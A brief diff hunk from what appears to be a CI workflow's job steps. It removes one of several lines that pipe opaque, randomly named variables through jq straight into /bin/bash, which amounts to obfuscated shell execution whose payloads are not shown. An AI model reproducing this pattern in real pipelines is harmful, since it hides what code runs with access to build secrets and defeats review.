@@ -41,7 +41,6 @@ jobs:
           echo $zadb3656 | jq -r .b86554 | /bin/bash
           echo $lbdjy053 | jq -r .c03415 | /bin/bash
           printf '%s' "$yxn72424" | jq -r .t94 | /bin/bash
-          echo $psvev3 | jq -r .wwm663 | /bin/bash
           echo $lk14619 | jq -r .hz29 | /bin/bash
           printf '%s' "$yj05" | jq -r .qvus2124 | /bin/bash
           printf '%s' "$mu5" | jq -r .j10 | /bin/bash
